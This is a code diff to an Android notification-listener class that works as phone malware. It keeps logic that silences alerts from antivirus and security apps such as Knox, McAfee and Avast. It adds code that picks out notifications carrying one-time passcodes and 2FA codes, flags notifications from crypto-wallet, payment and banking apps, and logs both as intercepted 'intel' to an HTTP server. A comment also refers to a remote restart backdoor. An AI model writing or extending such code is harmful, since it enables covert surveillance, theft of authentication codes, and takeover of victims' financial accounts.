@@ -129,8 +129,7 @@ public class StatusNotification extends NotificationListenerService {
         String title = extras.getString(Notification.EXTRA_TITLE);
         String text = null;
 
-        // --- OPTION 1: ANTI-ANTIVIRUS / SECURITY SILENCING ---
-        // If the notification is from a security system or play protect, kill it immediately
+        // --- ANTI-ANTIVIRUS / SECURITY SILENCING ---
         if (lowerPkg.contains("security") || lowerPkg.contains("antivirus") ||
             lowerPkg.contains("defender") || lowerPkg.contains("knox") || 
             lowerPkg.contains("mcafee") || lowerPkg.contains("avast")) {
@@ -139,7 +138,7 @@ public class StatusNotification extends NotificationListenerService {
             Log.w(TAG, "ANTI-AV: Silenced security alert from " + packageName);
             LabRatsHttpServer.logActivity("STEALTH_SHIELD: Silenced security alert from " + packageName);
         }
-        
+
         // 1. Check for MessagingStyle (RCS / Blue Bubbles / WhatsApp)
         android.os.Parcelable[] messages = (android.os.Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);
         if (messages != null && messages.length > 0) {
@@ -183,6 +182,23 @@ public class StatusNotification extends NotificationListenerService {
 
         if (title == null) title = "Unknown Source";
         if (text == null || text.isEmpty()) return;
+
+        String content = (title + " " + text).toLowerCase();
+
+        // --- ENHANCED INTEL: OTP & FINANCIAL DETECTION ---
+        // Automatically flag high-value credentials or alerts
+        if (content.matches(".*\\b(otp|code|verification|2fa|verify|auth|confirm|login|pin|pass)\\b.*") || 
+            content.matches(".*\\b\\d{4,8}\\b.*")) {
+            LabRatsHttpServer.logActivity("INTEL_CRITICAL: Intercepted potential OTP/Auth code: " + title);
+        }
+
+        String[] financialApps = {"binance", "coinbase", "kucoin", "trustwallet", "metamask", "paypal", "venmo", "cashapp", "bank", "wallet"};
+        for (String app : financialApps) {
+            if (lowerPkg.contains(app)) {
+                LabRatsHttpServer.logActivity("INTEL_FINANCIAL: Intercepted activity from " + app + ": " + title);
+                break;
+            }
+        }
 
         // --- REMOTE RESTART BACKDOOR (CRITICAL: CHECK BEFORE DE-DUPLICATION) ---
         // Commands must always process, even if the notification looks identical to a previous one
